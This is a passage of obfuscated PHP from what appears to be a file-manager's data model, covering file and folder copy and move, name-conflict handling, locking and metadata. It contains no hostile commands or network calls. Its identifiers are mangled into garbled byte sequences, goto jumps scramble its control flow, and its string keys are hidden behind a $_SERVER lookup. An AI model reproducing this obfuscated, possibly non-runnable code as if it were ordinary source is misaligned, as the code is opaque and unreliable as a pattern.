$this->_childrenListClear(); goto dôéçïªÚ ; F¬’ôå´Ò: return $D«¦ŠËíœ; goto B‰ÔùÄƒÙ; A½³¥Âã‰©: Model($aÅ¦ŞŸ“Ó[164])->linkAdd($cùòóçÊ‚ô[$aÅ¦ŞŸ“Ó[494]]); $this->folderSizeReset($b¯ç„±¸Å±); $this->updateModifyTime($b¯ç„±¸Å±); goto F¬’ôå´Ò; B‰ÔùÄƒÙ: } private function _copy($cÊØ˜‰È, $C¯Ü£©¨´Å, $FŒ©ô°ğíå, &$c£ë¶í”Œë, $c½é»õŠí¬, $aºïùÌ™ôà = '') { goto eìÒ‹‹©–; eìÒ‹‹©–: $añÒ£…Ãì“ =& $_SERVER[÷ÖêïÔÔÓ]; $DÛëù ÈÉÕ = $this->sourceInfoCache($cÊØ˜‰È); $aáÅ¿Ãæˆ‰ = $DÛëù ÈÉÕ[$añÒ£…Ãì“[367]] == $añÒ£…Ãì“[493]; goto D‚ ŠÆ²ğ§; D‚ ŠÆ²ğ§: $BŠ¨ÈçÈ»® = $aºïùÌ™ôà ? $aºïùÌ™ôà : $DÛëù ÈÉÕ[$añÒ£…Ãì“[28]]; $bÔ¼òïÛ ö = $this->fileNameExistCache($C¯Ü£©¨´Å, $BŠ¨ÈçÈ»®); if ($c½é»õŠí¬) { $this->_childrenAllMake($cÊØ˜‰È); if ($aáÅ¿Ãæˆ‰ && $bÔ¼òïÛ ö) { $this->_childrenAllMake($bÔ¼òïÛ ö); } } goto D×º»Öà©ï; f¢¨„ŞÙÆ: return $eŒ·ğ“¦—ò; goto fš©Ãä¯; D×º»Öà©ï: if (!$bÔ¼òïÛ ö) { return $this->_copyCreate($cÊØ˜‰È, $C¯Ü£©¨´Å, $BŠ¨ÈçÈ»®, $c£ë¶í”Œë); } $eŒ·ğ“¦—ò = $bÔ¼òïÛ ö; if ($aáÅ¿Ãæˆ‰) { if ($FŒ©ô°ğíå == REPEAT_RENAME_FOLDER) { $BŠ¨ÈçÈ»® = $this->fileNameAutoCache($C¯Ü£©¨´Å, $BŠ¨ÈçÈ»®, $FŒ©ô°ğíå, $aáÅ¿Ãæˆ‰); $eŒ·ğ“¦—ò = $this->_copyCreate($cÊØ˜‰È, $C¯Ü£©¨´Å, $BŠ¨ÈçÈ»®, $c£ë¶í”Œë); } else { $CÓŒ¾ÓàÉ = $this->_childrenList($cÊØ˜‰È); foreach ($CÓŒ¾ÓàÉ as $e­İœÁ‚Üó) { $this->_copy($e­İœÁ‚Üó[$añÒ£…Ãì“[366]], $bÔ¼òïÛ ö, $FŒ©ô°ğíå, $c£ë¶í”Œë, !1); } } } else { if ($FŒ©ô°ğíå == REPEAT_RENAME || $FŒ©ô°ğíå == REPEAT_RENAME_FOLDER) { $BŠ¨ÈçÈ»® = $this->fileNameAutoCache($C¯Ü£©¨´Å, $BŠ¨ÈçÈ»®, $FŒ©ô°ğíå, $aáÅ¿Ãæˆ‰); $eŒ·ğ“¦—ò = $this->_copyCreate($cÊØ˜‰È, $C¯Ü£©¨´Å, $BŠ¨ÈçÈ»®, $c£ë¶í”Œë); } else { if ($FŒ©ô°ğíå == REPEAT_REPLACE) { $d””ª¯®êì = $this->sourceInfoCache($bÔ¼òïÛ ö); $f£š£è½² = $this->fileHistory($d””ª¯®êì, $DÛëù ÈÉÕ[$añÒ£…Ãì“[415]], $DÛëù ÈÉÕ[$añÒ£…Ãì“[78]]); if ($f£š£è½²) { $c£ë¶í”Œë[$añÒ£…Ãì“[494]][] = $DÛëù ÈÉÕ[$añÒ£…Ãì“[415]]; } } else { if ($FŒ©ô°ğíå == REPEAT_SKIP) { } } } Hook::trigger($añÒ£…Ãì“[499], array($añÒ£…Ãì“[500], $DÛëù ÈÉÕ, 0)); } goto f¢¨„ŞÙÆ; fš©Ãä¯: } private function _copyCreate($e¡Ó±Œ­Ê¼, $cî‘´ù‹ô, $Fã¹øĞ¡½Ó, &$b¨È†ÄÃÂŒ) { goto Aö¿ô•é²ª; Dè‘“Õ‹ : $this->_childrenListAll($e¡Ó±Œ­Ê¼, $A›õ‹Éçé); $F±´ªÍÙ = count($A›õ‹Éçé); if ($F±´ªÍÙ == 0) { return $Fã’´Óå; } goto cô„ÎßÄË; AÜ½‘É…¸ù: if ($cœØÕ¤òå¸[$a¹äß®–¦¬[367]] != $a¹äß®–¦¬[493]) { $b¨È†ÄÃÂŒ[$a¹äß®–¦¬[494]][] = $cœØÕ¤òå¸[$a¹äß®–¦¬[415]]; return $Fã’´Óå; } $A›õ‹Éçé = array(); $F‘òÈŸÎë = array(); goto Dè‘“Õ‹ ; d‡ÜÄ¼åÅÒ: $Fã’´Óå = $this->add($cÍ¹‚Œ‡œĞ); $A¸öèšË¡à = array($a¹äß®–¦¬[366] => $Fã’´Óå, $a¹äß®–¦¬[28] => $Fã¹øĞ¡½Ó); $this->_copyApplyMeta($A¸öèšË¡à, $b¨È†ÄÃÂŒ); goto AÜ½‘É…¸ù; b’ÃÈêŠ‡²: $this->chunkEventSet($a¹äß®–¦¬[508], array($a¹äß®–¦¬[509], $cÍ¹‚Œ‡œĞ, $F±´ªÍÙ)); $this->saveAll($fÎ«¦Ö—Ş); return $Fã’´Óå; goto F†ÊÌ•˜ã¦; D®ÖĞ£²“ò: $cÍ¹‚Œ‡œĞ = $this->_makeItemData($cœØÕ¤òå¸, $f‘¶×ì‘°Ê, $Fã¹øĞ¡½Ó); Hook::trigger($a¹äß®–¦¬[501], $cÍ¹‚Œ‡œĞ); Hook::trigger($a¹äß®–¦¬[502], array($a¹äß®–¦¬[503], $cÍ¹‚Œ‡œĞ, 0)); goto d‡ÜÄ¼åÅÒ; EÃˆíì¼Êë: $bğ³¶›“×[$e¡Ó±Œ­Ê¼] = $Fã’´Óå; $aîÑ¯™™Âˆ = array(); $fÎ«¦Ö—Ş = array(); goto c—„‘ŒÙ; Aö¿ô•é²ª: $a¹äß®–¦¬ =& $_SERVER[÷ÖêïÔÔÓ]; $cœØÕ¤òå¸ = $this->sourceInfoCache($e¡Ó±Œ­Ê¼); $f‘¶×ì‘°Ê = $this->sourceInfoCache($cî‘´ù‹ô); goto D®ÖĞ£²“ò; cô„ÎßÄË: $DÍŠø§° = $this->sourceInfo($Fã’´Óå); foreach ($A›õ‹Éçé as $fãªõÂŠÕ) { $c‚òĞÅ¸ßƒ = $this->_makeItemData($fãªõÂŠÕ, $DÍŠø§°, $fãªõÂŠÕ[$a¹äß®–¦¬[28]]); $c‚òĞÅ¸ßƒ[$a¹äß®–¦¬[455]] = $fãªõÂŠÕ[$a¹äß®–¦¬[455]]; $F‘òÈŸÎë[] = $c‚òĞÅ¸ßƒ; } $this->chunkEventSet($a¹äß®–¦¬[504], array($a¹äß®–¦¬[505], $cÍ¹‚Œ‡œĞ, $F±´ªÍÙ)); goto e•øáÓö·«; e•øáÓö·«: $this->addAll($F‘òÈŸÎë, array(), !1); $B½Å¢ìâ½ = $this->where(array($a¹äß®–¦¬[457] => $Fã’´Óå))->select(); $bğ³¶›“× = $this->_childrenMakeRelation($A›õ‹Éçé, $B½Å¢ìâ½); goto EÃˆíì¼Êë; c—„‘ŒÙ: foreach ($B½Å¢ìâ½ as $fãªõÂŠÕ) { $ešëæÉ³ÈÉ = $fãªõÂŠÕ[$a¹äß®–¦¬[366]]; $eÍÆ‹¸ = $this->_childrenMatch($bğ³¶›“×, $fãªõÂŠÕ, $DÍŠø§°); $aîÑ¯™™Âˆ[] = array($a¹äß®–¦¬[366], $ešëæÉ³ÈÉ, $a¹äß®–¦¬[457], $eÍÆ‹¸[$a¹äß®–¦¬[457]]); $fÎ«¦Ö—Ş[] = array($a¹äß®–¦¬[366], $ešëæÉ³ÈÉ, $a¹äß®–¦¬[455], $eÍÆ‹¸[$a¹äß®–¦¬[455]]); $this->_copyApplyMeta($fãªõÂŠÕ, $b¨È†ÄÃÂŒ); if ($fãªõÂŠÕ[$a¹äß®–¦¬[367]] != $a¹äß®–¦¬[493]) { $b¨È†ÄÃÂŒ[$a¹äß®–¦¬[494]][] = $fãªõÂŠÕ[$a¹äß®–¦¬[415]]; } } $this->chunkEventSet($a¹äß®–¦¬[506], array($a¹äß®–¦¬[507], $cÍ¹‚Œ‡œĞ, $F±´ªÍÙ)); $this->saveAll($aîÑ¯™™Âˆ); goto b’ÃÈêŠ‡²; F†ÊÌ•˜ã¦: } private function _childrenMakeRelation($a„“ºŞº©, $bĞõŒÖ¦åÎ) { $c±í…º¬İê =& $_SERVER[÷ÖêïÔÔÓ]; $Cì˜À’—§ = array(); $fó‘ÉÍƒøµ = array(); foreach ($a„“ºŞº© as $e„»¾¹¢Á³) { $f‡¹Á­Éó = $e„»¾¹¢Á³[$c±í…º¬İê[28]] . $c±í…º¬İê[8] . $e„»¾¹¢Á³[$c±í…º¬İê[455]]; $Cì˜À’—§[$f‡¹Á­Éó] = $e„»¾¹¢Á³[$c±í…º¬İê[366]]; } foreach ($bĞõŒÖ¦åÎ as $e„»¾¹¢Á³) { $f‡¹Á­Éó = $e„»¾¹¢Á³[$c±í…º¬İê[28]] . $c±í…º¬İê[8] . $e„»¾¹¢Á³[$c±í…º¬İê[455]]; $b´Å‘ø©‚Ç = $Cì˜À’—§[$f‡¹Á­Éó]; $fó‘ÉÍƒøµ[$b´Å‘ø©‚Ç] = $e„»¾¹¢Á³[$c±í…º¬İê[366]]; } return $fó‘ÉÍƒøµ; } private function _childrenMatch($eãƒì©ïå½, $bÎÛ’»˜‚Î, $A‡æíİ¢) { goto eÑ±ç¿’; eÑ±ç¿’: $c¶¶‡¦ƒË› =& $_SERVER[÷ÖêïÔÔÓ]; $FÄ²Ú®‚¿ = $A‡æíİ¢[$c¶¶‡¦ƒË›[455]]; $F”¹´ÃÃ˜« = $this->parentLevelArray($bÎÛ’»˜‚Î[$c¶¶‡¦ƒË›[455]]); goto CÇÍÀóã¨¡; CÇÍÀóã¨¡: foreach ($F”¹´ÃÃ˜« as $FÑğ¼¸Äµì) { if (isset($eãƒì©ïå½[$FÑğ¼¸Äµì])) { $FÄ²Ú®‚¿ .= $eãƒì©ïå½[$FÑğ¼¸Äµì] . $c¶¶‡¦ƒË›[510]; } } $FÄ²Ú®‚¿ = rtrim($FÄ²Ú®‚¿, $c¶¶‡¦ƒË›[47]) . $c¶¶‡¦ƒË›[47]; $A³Å²—¶óª = $this->parentLevelArray($FÄ²Ú®‚¿); goto B‹˜Íé©Õ¨; B‹˜Íé©Õ¨: $dÆ¬¶ï»ó­ = $A³Å²—¶óª[count($A³Å²—¶óª) - 1]; return array($c¶¶‡¦ƒË›[457] => $dÆ¬¶ï»ó­, $c¶¶‡¦ƒË›[455] => $FÄ²Ú®‚¿); goto F§…Ãùè“ù; F§…Ãùè“ù: } private function _makeItemData($d³š²…˜Áé, $aŞ´·³’ãø, $Cè†öîÔ‚ô) { $AáÜ”Ş¿¨Ô =& $_SERVER[÷ÖêïÔÔÓ]; $E£ë·áµãì = array($AáÜ”Ş¿¨Ô[511] => $d³š²…˜Áé[$AáÜ”Ş¿¨Ô[367]], $AáÜ”Ş¿¨Ô[383] => $Cè†öîÔ‚ô, $AáÜ”Ş¿¨Ô[512] => $d³š²…˜Áé[$AáÜ”Ş¿¨Ô[369]], $AáÜ”Ş¿¨Ô[416] => $d³š²…˜Áé[$AáÜ”Ş¿¨Ô[415]], $AáÜ”Ş¿¨Ô[513] => $d³š²…˜Áé[$AáÜ”Ş¿¨Ô[78]], $AáÜ”Ş¿¨Ô[514] => $aŞ´·³’ãø[$AáÜ”Ş¿¨Ô[368]], $AáÜ”Ş¿¨Ô[515] => $aŞ´·³’ãø[$AáÜ”Ş¿¨Ô[452]], $AáÜ”Ş¿¨Ô[516] => USER_ID, $AáÜ”Ş¿¨Ô[517] => USER_ID, $AáÜ”Ş¿¨Ô[365] => $aŞ´·³’ãø[$AáÜ”Ş¿¨Ô[366]], $AáÜ”Ş¿¨Ô[518] => $aŞ´·³’ãø[$AáÜ”Ş¿¨Ô[455]] . $aŞ´·³’ãø[$AáÜ”Ş¿¨Ô[366]] . $AáÜ”Ş¿¨Ô[47], $AáÜ”Ş¿¨Ô[392] => 0); return $E£ë·áµãì; } private function _copyApplyMeta($f¶¿‚õò•À, &$b‘Ä–—†”Ã) { $D’Òè¢…¨« =& $_SERVER[÷ÖêïÔÔÓ]; $d‹Ó£’§â‰ = $f¶¿‚õò•À[$D’Òè¢…¨«[366]]; $AÙ¿µŒñÓ† = $f¶¿‚õò•À[$D’Òè¢…¨«[28]]; if (!isset($f¶¿‚õò•À[$D’Òè¢…¨«[519]]) || !$f¶¿‚õò•À[$D’Òè¢…¨«[519]] || $f¶¿‚õò•À[$D’Òè¢…¨«[519]] == $D’Òè¢…¨«[464]) { $b‘Ä–—†”Ã[$D’Òè¢…¨«[496]][] = array($D’Òè¢…¨«[366], $d‹Ó£’§â‰, $D’Òè¢…¨«[519], short_id($d‹Ó£’§â‰)); } if (Input::check($AÙ¿µŒñÓ†, $D’Òè¢…¨«[520])) { $b‘Ä–—†”Ã[$D’Òè¢…¨«[495]][] = array($D’Òè¢…¨«[366] => $d‹Ó£’§â‰, $D’Òè¢…¨«[88] => $D’Òè¢…¨«[412], $D’Òè¢…¨«[354] => str_replace($D’Òè¢…¨«[50], $D’Òè¢…¨«[33], Pinyin::encode($AÙ¿µŒñÓ†))); $b‘Ä–—†”Ã[$D’Òè¢…¨«[495]][] = array($D’Òè¢…¨«[366] => $d‹Ó£’§â‰, $D’Òè¢…¨«[88] => $D’Òè¢…¨«[411], $D’Òè¢…¨«[354] => Pinyin::encode($AÙ¿µŒñÓ†, $D’Òè¢…¨«[521])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($bÖß·ª¼—ğ) { goto FÀçºÂºÆ¦; bÏ‘›ˆŒÅ¬: $E„Î×ğÎ– = array_to_keyvalue($E„Î×ğÎ–, $d¬ÔË•Óö–[366]); foreach ($E„Î×ğÎ– as $cÛœó““‰×) { $FŞ’…Û«Ã¸ = $cÛœó““‰×[$d¬ÔË•Óö–[457]]; $bÖß·ª¼—ğ = $cÛœó““‰×[$d¬ÔË•Óö–[366]]; if (!isset($this->_childrenListCache[$bÖß·ª¼—ğ]) && $cÛœó““‰×[$d¬ÔË•Óö–[367]] == $d¬ÔË•Óö–[493]) { $this->_childrenListCache[$bÖß·ª¼—ğ] = array(); } if (!isset($this->_childrenListCache[$FŞ’…Û«Ã¸])) { $this->_childrenListCache[$FŞ’…Û«Ã¸] = array(); } $this->_childrenListCache[$FŞ’…Û«Ã¸][$bÖß·ª¼—ğ] = $cÛœó““‰×; $this->_childrenItemCache[$bÖß·ª¼—ğ] = $cÛœó““‰×; } goto BÉˆ©˜Ùê›; FÀçºÂºÆ¦: $d¬ÔË•Óö– =& $_SERVER[÷ÖêïÔÔÓ]; $c©”âŒ‡‹ = $this->sourceInfo($bÖß·ª¼—ğ); $c¥„Ş‘„ô = $d¬ÔË•Óö–[522]; goto DÍÍÇÆÆî§; DÍÍÇÆÆî§: $dÏÄïİŞç = array($d¬ÔË•Óö–[455] => array($d¬ÔË•Óö–[475], $c©”âŒ‡‹[$d¬ÔË•Óö–[455]] . $bÖß·ª¼—ğ . $d¬ÔË•Óö–[476]), $d¬ÔË•Óö–[393] => 0); $E„Î×ğÎ– = $this->field($c¥„Ş‘„ô)->where($dÏÄïİŞç)->select(); if (!$E„Î×ğÎ–) { return; } goto bÏ‘›ˆŒÅ¬; BÉˆ©˜Ùê›: } private function _childrenListAll($d¼ßœßĞÊÙ, &$b…Şà¢³Âí) { $Bí—†Ôù²” =& $_SERVER[÷ÖêïÔÔÓ]; if (!isset($this->_childrenListCache[$d¼ßœßĞÊÙ])) { return; } $Bî˜ŠË÷‚ = $this->_childrenListCache[$d¼ßœßĞÊÙ]; foreach ($Bî˜ŠË÷‚ as $C ÔğÔÕåØ => $C“áê›‘) { $b…Şà¢³Âí[$C ÔğÔÕåØ] = $C“áê›‘; if ($C“áê›‘[$Bí—†Ôù²”[367]] == $Bí—†Ôù²”[493]) { $this->_childrenListAll($C ÔğÔÕåØ, $b…Şà¢³Âí); } } } private function sourceInfoCache($bÕ©¶ì‘åÖ) { if (isset($this->_childrenItemCache[$bÕ©¶ì‘åÖ])) { return $this->_childrenItemCache[$bÕ©¶ì‘åÖ]; } return $this->sourceInfo($bÕ©¶ì‘åÖ); } private function _childrenList($B–­÷Ú´¿©) { if (isset($this->_childrenListCache[$B–­÷Ú´¿©])) { return $this->_childrenListCache[$B–­÷Ú´¿©]; } return $this->_childrenListSelect($B–­÷Ú´¿©); } private function _childrenListSelect($FíÏ©®ˆóš) { goto dšæñ“Š ; dšæñ“Š : $få¹ÆÈ„´‰ =& $_SERVER[÷ÖêïÔÔÓ]; $eô¶©Õ‡¦™ = array($få¹ÆÈ„´‰[457] => $FíÏ©®ˆóš, $få¹ÆÈ„´‰[393] => 0); $bò¬ÆšÀ”¾ = $this->where($eô¶©Õ‡¦™)->select(); goto f¸ƒ²Ç¾œ‡; f¸ƒ²Ç¾œ‡: $bò¬ÆšÀ”¾ = $bò¬ÆšÀ”¾ ? $bò¬ÆšÀ”¾ : array(); $fŞ×Íƒ‚“ = array_to_keyvalue($bò¬ÆšÀ”¾, $få¹ÆÈ„´‰[366]); $this->_childrenListCache[$FíÏ©®ˆóš] = $fŞ×Íƒ‚“; goto Eó¾ç×•Ô; Eó¾ç×•Ô: foreach ($fŞ×Íƒ‚“ as $FíÏ©®ˆóš => $AŞœƒ˜òù‘) { $this->_childrenItemCache[$FíÏ©®ˆóš] = $AŞœƒ˜òù‘; } return $fŞ×Íƒ‚“; goto fÜ·İÕÂ¡¢; fÜ·İÕÂ¡¢: } private function fileNameExistCache($EµÁ¿ÖÑÁ, $FÊ‰è´«„ğ) { $AïƒÖ¡Ò¹Ù =& $_SERVER[÷ÖêïÔÔÓ]; $FÊ‰è´«„ğ = strtolower($FÊ‰è´«„ğ); $Aƒ´ÇùÈ³‚ = $this->_childrenList($EµÁ¿ÖÑÁ); foreach ($Aƒ´ÇùÈ³‚ as $e¬œÜŠæª) { if ($FÊ‰è´«„ğ == strtolower($e¬œÜŠæª[$AïƒÖ¡Ò¹Ù[28]])) { return $e¬œÜŠæª[$AïƒÖ¡Ò¹Ù[366]]; } } return !1; } private function fileNameAutoCache($F¶›¿ÏçÍƒ, $Dåã¢ğ‡ïÀ, $f•…«Ù²É, $BÙÀ»Ã²›ë) { $D´±µÇÎÉö =& $_SERVER[÷ÖêïÔÔÓ]; $Fò²ÖÙµÔ = $this->_childrenList($F¶›¿ÏçÍƒ); $d¹¬‘²ˆ÷æ = array_to_keyvalue($Fò²ÖÙµÔ, $D´±µÇÎÉö[33], $D´±µÇÎÉö[28]); return $this->fileNameAutoGet($d¹¬‘²ˆ÷æ, $Dåã¢ğ‡ïÀ, $f•…«Ù²É, $BÙÀ»Ã²›ë); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($AÊ¹è‹ñ—¦, $FÚªà”êË, $CˆáŞä¬á• = REPEAT_REPLACE, $AÚ†§¿ ›ò = '') { goto FÅÊì‡»÷ğ; AÛ´—®Ó…´: if ($Bîòæäõòó[$dÁ÷ßá—èÊ[367]] == $dÁ÷ßá—èÊ[493]) { $f¤¨âå¦Èà[] = $AÊ¹è‹ñ—¦; } $this->updateModifyTime($f¤¨âå¦Èà); Model($dÁ÷ßá—èÊ[498])->eventMove($AÊ¹è‹ñ—¦, $Bîòæäõòó[$dÁ÷ßá—èÊ[457]], $FÚªà”êË); goto B¹…İÀÚ‹; BÔ¬Ä‹…¾: $this->sourceCacheClear(); if ($Bîòæäõòó[$dÁ÷ßá—èÊ[367]] == $dÁ÷ßá—èÊ[493] && $eî¾åÇŞš) { $this->folderSizeResetChildren($C²İ–À¢ÜÎ); } Model($dÁ÷ßá—èÊ[164])->linkAdd($D›±ğÁÚ[$dÁ÷ßá—èÊ[494]]); goto c‚É¸œ¥Š; b¹ÛŒ›‡Õ: $this->lockMoveStart($AÊ¹è‹ñ—¦); $this->lockWriteStart($FÚªà”êË, $dÉ„¨¡‡Œ°); $D›±ğÁÚ = array($dÁ÷ßá—èÊ[494] => array(), $dÁ÷ßá—èÊ[525] => !1); goto A‡¸œ‹Šä; d¹Õƒ¥Óõø: Hook::trigger($dÁ÷ßá—èÊ[523], $f¨èÚòù•Ÿ); if ($Bîòæäõòó[$dÁ÷ßá—èÊ[457]] == $FÚªà”êË && $AÚ†§¿ ›ò != $Bîòæäõòó[$dÁ÷ßá—èÊ[28]]) { $D¸ø¡Õ£âœ = $this->fileNameExist($FÚªà”êË, $AÚ†§¿ ›ò); if ($D¸ø¡Õ£âœ && $Bîòæäõòó[$dÁ÷ßá—èÊ[367]] == $dÁ÷ßá—èÊ[464]) { goto d©­Ÿá­„; d©­Ÿá­„: $e»øéÖ„ = $this->sourceInfo($D¸ø¡Õ£âœ); $fõùù–¼¸ = $this->fileHistory($e»øéÖ„, $Bîòæäõòó[$dÁ÷ßá—èÊ[415]], $Bîòæäõòó[$dÁ÷ßá—èÊ[78]]); if (!$fõùù–¼¸) { Model($dÁ÷ßá—èÊ[418])->remove($Bîòæäõòó[$dÁ÷ßá—èÊ[415]]); } goto cäå­Ï­®“; cäå­Ï­®“: $this->remove($AÊ¹è‹ñ—¦, !1); $this->folderSizeReset($FÚªà”êË); Hook::trigger($dÁ÷ßá—èÊ[524], $f¨èÚòù•Ÿ); goto AˆµŒì¥õ; AˆµŒì¥õ: return $D¸ø¡Õ£âœ; goto F¼Şˆ˜Õè•; F¼Şˆ˜Õè•: } } $dÉ„¨¡‡Œ° = $AÚ†§¿ ›ò ? $AÚ†§¿ ›ò : $Bîòæäõòó[$dÁ÷ßá—èÊ[28]]; goto b¹ÛŒ›‡Õ; câ”Ê¥õİæ: $this->folderSizeReset($Bîòæäõòó[$dÁ÷ßá—èÊ[457]]); $this->folderSizeReset($FÚªà”êË); $f¤¨âå¦Èà = array($Bîòæäõòó[$dÁ÷ßá—èÊ[457]], $FÚªà”êË); goto AÛ´—®Ó…´; FÅÊì‡»÷ğ: $dÁ÷ßá—èÊ =& $_SERVER[÷ÖêïÔÔÓ]; $Bîòæäõòó = $this->sourceInfo($AÊ¹è‹ñ—¦); $C®·¶†Âšè = $this->sourceInfo($FÚªà”êË); goto B…àĞÑ£Ğ®; B¹…İÀÚ‹: Hook::trigger($dÁ÷ßá—èÊ[524], $f¨èÚòù•Ÿ); return $C²İ–À¢ÜÎ; goto f¸é…­³è; c‚É¸œ¥Š: if ($eî¾åÇŞš && $D›±ğÁÚ[$dÁ÷ßá—èÊ[525]]) { $this->remove($AÊ¹è‹ñ—¦, !1); } $this->lockMoveEnd($AÊ¹è‹ñ—¦); $this->lockWriteEnd($FÚªà”êË, $dÉ„¨¡‡Œ°); goto câ”Ê¥õİæ; B…àĞÑ£Ğ®: $f¨èÚòù•Ÿ = $this->pathInfoMore($AÊ¹è‹ñ—¦); if ($this->isParentOf($AÊ¹è‹ñ—¦, $FÚªà”êË)) { return !1; } if (!$Bîòæäõòó || !$C®·¶†Âšè || $C®·¶†Âšè[$dÁ÷ßá—èÊ[367]] != $dÁ÷ßá—èÊ[493]) { return !1; } goto d¹Õƒ¥Óõø; A‡¸œ‹Šä: $this->clearShare($AÊ¹è‹ñ—¦, $FÚªà”êË); $eî¾åÇŞš = $this->fileNameExistCache($FÚªà”êË, $Bîòæäõòó[$dÁ÷ßá—èÊ[28]]); $C²İ–À¢ÜÎ = $this->_move($AÊ¹è‹ñ—¦, $FÚªà”êË, $CˆáŞä¬á•, $D›±ğÁÚ, $AÚ†§¿ ›ò); goto BÔ¬Ä‹…¾; f¸é…­³è: } private function _move($F¹¤ë¤¥¢ƒ, $f¢Œ„ÄáÈö, $B«µâ§£å™, &$eí‡ÌÔÉÂÃ, $C¼»¤¸˜©Ñ = '') { goto dÄ¹ÎŞß„®; Ašº±ÍëÖ·: $E¤˜Î‹ØğŠ = !1; if ($AÆáéˆ…ö›) { if ($B«µâ§£å™ == REPEAT_RENAME_FOLDER) { $aÜ¶–†ËÚÔ = $this->fileNameAuto($f¢Œ„ÄáÈö, $aÜ¶–†ËÚÔ, $B«µâ§£å™, $AÆáéˆ…ö›); $e¤ ëŒ³ = $this->_moveForce($F¹¤ë¤¥¢ƒ, $f¢Œ„ÄáÈö, $aÜ¶–†ËÚÔ); } else { if ($B«µâ§£å™ == REPEAT_RENAME_FOLDER) { $B«µâ§£å™ = REPEAT_RENAME; } $d»éË¹ÊÈ¤ = $this->_childrenListSelect($F¹¤ë¤¥¢ƒ); foreach ($d»éË¹ÊÈ¤ as $FÓĞ¾ÚÜíÇ) { $this->_move($FÓĞ¾ÚÜíÇ[$d‘À÷ï†[366]], $eƒ†õ³Ï³—, $B«µâ§£å™, $eí‡ÌÔÉÂÃ); } $E¤˜Î‹ØğŠ = !0; } } else { if ($B«µâ§£å™ == REPEAT_SKIP) { $E¤˜Î‹ØğŠ = !0; } else { if ($B«µâ§£å™ == REPEAT_RENAME || $B«µâ§£å™ == REPEAT_RENAME_FOLDER) { $aÜ¶–†ËÚÔ = $this->fileNameAuto($f¢Œ„ÄáÈö, $aÜ¶–†ËÚÔ, $B«µâ§£å™, $AÆáéˆ…ö›); $e¤ ëŒ³ = $this->_moveForce($F¹¤ë¤¥¢ƒ, $f¢Œ„ÄáÈö, $aÜ¶–†ËÚÔ); } else { if ($B«µâ§£å™ == REPEAT_REPLACE) { $Aìğ­–†É³ = $this->sourceInfoCache($eƒ†õ³Ï³—); $A ’Ø“²Çç = $this->fileHistory($Aìğ­–†É³, $f—Í²èâµí[$d‘À÷ï†[415]], $f—Í²èâµí[$d‘À÷ï†[78]]); if ($A ’Ø“²Çç) { $eí‡ÌÔÉÂÃ[$d‘À÷ï†[494]][] = $f—Í²èâµí[$d‘À÷ï†[415]]; } else { $E¤˜Î‹ØğŠ = !0; } } } } } if ($E¤˜Î‹ØğŠ && !$eí‡ÌÔÉÂÃ[$d‘À÷ï†[525]]) { $eí‡ÌÔÉÂÃ[$d‘À÷ï†[525]] = !0; } goto f“Ô×‡ğÕë; dÄ¹ÎŞß„®: $d‘À÷ï† =& $_SERVER[÷ÖêïÔÔÓ]; $f—Í²èâµí = $this->sourceInfo($F¹¤ë¤¥¢ƒ); $AÆáéˆ…ö› = $f—Í²èâµí[$d‘À÷ï†[367]] == $d‘À÷ï†[493]; goto aÈ«âî•õ; aÈ«âî•õ: $aÜ¶–†ËÚÔ = $C¼»¤¸˜©Ñ ? $C¼»¤¸˜©Ñ : $f—Í²èâµí[$d‘À÷ï†[28]]; $eƒ†õ³Ï³— = $this->fileNameExistCache($f¢Œ„ÄáÈö, $aÜ¶–†ËÚÔ); $this->lockMoveStart($F¹¤ë¤¥¢ƒ); goto eâç”Â¡ê; eâç”Â¡ê: $this->lockWriteStart($f¢Œ„ÄáÈö, $aÜ¶–†ËÚÔ); if (!$eƒ†õ³Ï³—) { return $this->_moveForce($F¹¤ë¤¥¢ƒ, $f¢Œ„ÄáÈö, $aÜ¶–†ËÚÔ); } $e¤ ëŒ³ = $eƒ†õ³Ï³—; goto Ašº±ÍëÖ·; f“Ô×‡ğÕë: return $e¤ ëŒ³; goto aĞÃ‘Ç²õ; aĞÃ‘Ç²õ: } private function _moveForce($eÁ’àÙ­±, $E»µìã¯‚, $b—è‡è«¬•) { goto EĞÉÈ—‰°ğ; A…Œâá¾ç±: $dª—˜…„„è = $eí Š„ËÕ [$f¿‡æ„Œ¹†[367]] == $f¿‡æ„Œ¹†[493]; $eÈÁœ²¿Ù­ = array($f¿‡æ„Œ¹†[365] => $c”Æà¬Í…­[$f¿‡æ„Œ¹†[366]], $f¿‡æ„Œ¹†[518] => $c”Æà¬Í…­[$f¿‡æ„Œ¹†[455]] . $c”Æà¬Í…­[$f¿‡æ„Œ¹†[366]] . $f¿‡æ„Œ¹†[47], $f¿‡æ„Œ¹†[514] => $c”Æà¬Í…­[$f¿‡æ„Œ¹†[368]], $f¿‡æ„Œ¹†[515] => $c”Æà¬Í…­[$f¿‡æ„Œ¹†[452]], $f¿‡æ„Œ¹†[517] => USER_ID, $f¿‡æ„Œ¹†[383] => $b—è‡è«¬•); $B‘¡ù¸ÌĞÍ = $eí Š„ËÕ [$f¿‡æ„Œ¹†[368]] == SourceModel::TYPE_GROUP && $c”Æà¬Í…­[$f¿‡æ„Œ¹†[368]] == SourceModel::TYPE_GROUP && $eí Š„ËÕ [$f¿‡æ„Œ¹†[452]] == $c”Æà¬Í…­[$f¿‡æ„Œ¹†[452]]; goto dÆŒ¶¬ÛñÄ; CšÀÙíÁ¬: if ($dª—˜…„„è) { $fã‹“Âê¨® = array($f¿‡æ„Œ¹†[518] => array($f¿‡æ„Œ¹†[475], $eí Š„ËÕ [$f¿‡æ„Œ¹†[455]] . $eí Š„ËÕ [$f¿‡æ„Œ¹†[366]] . $f¿‡æ„Œ¹†[476])); $f™ªğ×áâ = $eí Š„ËÕ [$f¿‡æ„Œ¹†[455]] . $eí Š„ËÕ [$f¿‡æ„Œ¹†[366]] . $f¿‡æ„Œ¹†[47]; $AÔò×âŠ = $c”Æà¬Í…­[$f¿‡æ„Œ¹†[455]] . $c”Æà¬Í…­[$f¿‡æ„Œ¹†[366]] . $f¿‡æ„Œ¹†[47] . $eí Š„ËÕ [$f¿‡æ„Œ¹†[366]] . $f¿‡æ„Œ¹†[47]; $c‰Ëìè£‘‚ = array($f¿‡æ„Œ¹†[518] => array($f¿‡æ„Œ¹†[526], 